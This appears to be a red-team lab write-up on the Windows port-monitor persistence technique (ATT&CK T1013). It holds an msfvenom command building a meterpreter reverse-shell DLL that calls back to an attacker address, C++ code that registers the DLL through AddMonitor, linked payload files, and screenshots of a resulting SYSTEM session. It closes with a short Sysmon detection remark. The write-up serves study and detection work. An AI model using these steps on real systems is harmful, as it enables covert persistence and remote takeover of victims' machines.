---
description: 'Persistence, Privilege Escalation'
---

# T1013: AddMonitor\(\)

## Execution

Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe as part of the technique - see bottom of the page for more info about the technique's high-lever overview:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Writing and compiling a simple C++ code that will register the monitor port:

{% code-tabs %}
{% code-tabs-item title="monitor.cpp" %}
```cpp
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% file src="../.gitbook/assets/t1013-portmonitor64.exe" caption="PortMonitor64" %}

{% file src="../.gitbook/assets/evil64.dll" caption="evil64.dll - meterpreter payload" %}

Move evil64.dll to %systemroot% and execute the compiled `monitor.cpp`.

## Observations

Upon launching the compiled executable and inspecting the victim machine with procmon, we can see that the evil64.dll is being accessed:

![](../.gitbook/assets/monitor-loaddll.png)

![](../.gitbook/assets/monitor-loaddll2.png)

which spawns a rundll32 process \(meterpreter payload\) which initiates a connection back to the attacker:

![](../.gitbook/assets/rundll-connect.png)

The attacker receives a reverse meterpreter session as **SYSTEM**:

![](../.gitbook/assets/monitor-shell-system.png)

The below shows the procmon results explained above:

![](../.gitbook/assets/monitor-spoolsvc-rundll.png)

Sysmon commandline arguments and network connection logging to the rescue:

![](../.gitbook/assets/monitor-sysmon.png)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1013\",\"type\":\"link\",\"title\":\"Port Monitors - ATT&CK for Enterprise\"}" %}

{% embed data="{\"url\":\"https://www.youtube.com/watch?v=dq2Hv7J9fvk\",\"type\":\"video\",\"title\":\"DEF CON 22 - Brady Bloxham - Getting Windows to Play with Itself\",\"description\":\"Slides here: https://defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf\\n\\nGetting Windows to Play with Itself: A Hacker\'s Guide to Windows API Abuse \\nBrady Bloxham PRINCIPAL SECURITY CONSULTANT, SILENT BREAK SECURITY \\nWindows APIs are often a blackbox with poor documentation, taking input and spewing output with little visibility on what actually happens in the background. By analyzing \(and abusing\) the underlying functionality of these seemingly benign APIs, we can effectively manipulate Windows into performing stealthy custom attacks bypassing the latest in protective defenses. In this talk, we’ll get Windows to play with itself nonstop while revealing 0day persistence, previously unknown DLL injection techniques, and Windows API tips and tricks that any good penetration tester and/or malware developer should know. :\) To top it all off, a custom HTTP beaconing backdoor will be released leveraging the newly released persistence and injection techniques. So much Windows abuse, so little time.\\n\\n\\nBrady Bloxham is founder and Principal Security Consultant at Silent Break Security, where he focuses on providing advanced, custom penetration testing services. Brady started his career working for the various three letter agencies, where he earned multiple awards for exceptional performance in conducting classified network operations. Brady stays current in the information security field by presenting at various hacker conferences, as well as providing training on building custom offensive security tools and advanced penetration testing techniques. Brady also maintains the PwnOS project and holds several highly respected industry certifications. :\)\",\"icon\":{\"type\":\"icon\",\"url\":\"https://www.youtube.com/yts/img/favicon\_144-vfliLAfaB.png\",\"width\":144,\"height\":144,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://i.ytimg.com/vi/dq2Hv7J9fvk/maxresdefault.jpg\",\"width\":1280,\"height\":720,\"aspectRatio\":0.5625},\"embed\":{\"type\":\"player\",\"url\":\"https://www.youtube.com/embed/dq2Hv7J9fvk?rel=0&showinfo=0\",\"html\":\"<div style=\\\"left: 0; width: 100%; height: 0; position: relative; padding-bottom: 56.2493%;\\\"><iframe src=\\\"https://www.youtube.com/embed/dq2Hv7J9fvk?rel=0&amp;showinfo=0\\\" style=\\\"border: 0; top: 0; left: 0; width: 100%; height: 100%; position: absolute;\\\" allowfullscreen scrolling=\\\"no\\\"></iframe></div>\",\"aspectRatio\":1.7778}}" %}

{% embed data="{\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd183341\(v=vs.85\).aspx\",\"type\":\"link\",\"title\":\"AddMonitor function \(Windows\)\",\"icon\":{\"type\":\"icon\",\"url\":\"https://msdn.microsoft.com/Areas/Epx/Themes/Windows/Content/Winlogo\_favicon.ico\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd145068\(v=vs.85\).aspx\",\"type\":\"link\",\"title\":\"MONITOR\_INFO\_2 structure \(Windows\)\",\"icon\":{\"type\":\"icon\",\"url\":\"https://msdn.microsoft.com/Areas/Epx/Themes/Windows/Content/Winlogo\_favicon.ico\",\"aspectRatio\":0}}" %}



